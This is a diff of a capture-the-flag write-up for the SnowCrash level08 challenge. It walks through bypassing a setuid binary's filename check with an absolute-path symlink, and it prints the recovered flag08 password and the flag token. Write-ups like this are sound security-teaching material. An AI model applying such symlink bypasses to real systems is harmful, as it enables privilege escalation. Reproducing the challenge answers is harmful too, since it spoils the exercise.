@@ -1,7 +1,7 @@
 ## Solution
 
 ```console
-~$ ls -l
+level08@SnowCrash:~$ ls -l
 -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
 -rw-------  1 flag08 flag08    26 Mar  5  2016 token
 ```
@@ -66,8 +66,8 @@ int main(int argc,char **argv,char **envp)
 name is passed as a parameter
 
 ```console
-~$ echo "toto" > /tmp/test
-~$ ./level08 /tmp/test
+level08@SnowCrash:~$ echo "toto" > /tmp/test
+level08@SnowCrash:~$ ./level08 /tmp/test
 toto
 ```
 
@@ -82,7 +82,7 @@ pcVar1 = strstr(argv[1],"token");
 ```
 
 ```console
-~$ ./level08 token
+level08@SnowCrash:~$ ./level08 token
 You may not access 'token'
 ```
 
@@ -91,8 +91,47 @@ You may not access 'token'
 Je suppose que le flag / le password du user flag08 est dans token  
 
 ```console
-~$ mv token test
+level08@SnowCrash:~$ mv token test
 mv: cannot move `token' to `test': Permission denied
 ```
 
-Copier contenu de token ?
+Symbolic link?
+
+```console
+level08@SnowCrash:~$ ln -s token /tmp/hacktest
+level08@SnowCrash:~$ ./level08 /tmp/hacktest 
+level08@SnowCrash:~$ echo $?
+0
+```
+No Error no output?  
+But this works
+```console
+level08@SnowCrash:~$ ./level08 /tmp/test
+toto
+level08@SnowCrash:~$ ln -s /tmp/test /tmp/test2
+level08@SnowCrash:~$ ./level08 /tmp/test2
+toto
+```
+And this too
+```console
+level08@SnowCrash:~$ ln -s token /tmp/token2
+level08@SnowCrash:~$ ./level08 /tmp/token2
+You may not access '/tmp/token2'
+```
+
+ABSOLUTE LINK WORKS
+```console
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/hacktest
+level08@SnowCrash:~$ ./level08 /tmp/hacktest
+quif5eloekouj29ke0vouxean
+```
+
+`quif5eloekouj29ke0vouxean`
+
+```console
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
